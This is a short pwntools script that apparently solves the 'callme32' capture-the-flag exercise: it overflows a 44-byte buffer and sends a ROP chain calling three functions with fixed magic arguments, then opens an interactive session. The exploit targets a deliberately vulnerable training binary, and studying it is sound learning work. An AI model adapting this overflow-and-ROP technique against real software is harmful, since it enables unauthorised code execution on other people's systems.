from pwn import *

p = process('./callme32')
e = ELF('./callme32')
rop = ROP(e)

args = [0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D]

payload = b'A' * 44

rop.call(e.symbols['callme_one'], args)
rop.call(e.symbols['callme_two'], args)
rop.call(e.symbols['callme_three'], args)

payload += rop.chain()

p.send(payload)
p.interactive()
